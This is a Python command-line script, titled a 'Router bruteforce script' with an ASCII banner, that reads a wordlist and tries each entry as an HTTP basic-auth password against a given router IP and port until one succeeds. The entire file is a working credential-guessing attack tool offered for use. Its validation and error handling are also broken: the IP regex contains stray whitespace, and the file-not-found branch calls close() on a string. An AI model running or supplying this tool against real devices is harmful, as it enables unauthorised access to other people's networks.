import argparse
from requests import get
import colorama
from time import time
from re import search

colorama.init(autoreset=True)

parser = argparse.ArgumentParser(description='Router bruteforce script')

parser.add_argument('-p', dest='port', help='Port', required=True)
parser.add_argument('-ip', dest='ip', help='IP', required=True)
parser.add_argument('-b', dest='blist', help='Way ro brutelist', required=True)
parser.add_argument('-l', dest='login', help='Login', required=True)

def ip_validate(ip):
    regex = '''^(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.( 
            25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$'''
    if(search(regex, ip)):  
        return True
    else:
        return False
def brute(list, ip, port, login):
    print("\n d8888b.  .d88b.  db    db d888888b d88888b d8888b."+colorama.Fore.RED+" d8888b. d88888b\n",
          "88  `8D .8P  Y8. 88    88 `~~88~~' 88'     88  `8D "+colorama.Fore.RED+"88  `8D 88\n",
          "88oobY' 88    88 88    88    88    88ooooo 88oobY' "+colorama.Fore.RED+"88oooY' 88ooo\n",                                                                      "88`8b   88    88 88    88    88    88~~~~~ 88`8b   "+colorama.Fore.RED+"88~~~b. 88~~~\n",
          "88 `88. `8b  d8' 88b  d88    88    88.     88 `88. "+colorama.Fore.RED+"88   8D 88\n",
          "88   YD  `Y88P'  ~Y8888P'    YP    Y88888P 88   YD "+colorama.Fore.RED+"Y8888P' YP\n",
"                                                      by denkus24")
    if not ip_validate(ip):
        print(colorama.Fore.RED+'Invalid IP')
    try:
        list = open(list,'r')
    except FileNotFoundError:
        list.close()
        print(colorama.Fore.RED+'Brutelist does not exist')
        quit()
        
    words = list.read().split('\n')
    words_length = len(words)
    print('Opened list with',len(words),'words')
    try_nomber = 0
    
    start_time = time()
    for x in words:
        try_nomber += 1
        print('Trying ' + x + ' [' + str(try_nomber) + '/' + str(words_length) + ']')
        status = get('http://'+ip+':'+port, auth=(login, x)).status_code

        if status == 200:
            print("Password is", colorama.Fore.GREEN+x)
            print("The password was found through",colorama.Back.CYAN+str(round(time() - start_time,3)),'seconds')
            break
        
args = parser.parse_args()
brute(args.blist,args.ip,args.port,args.login)
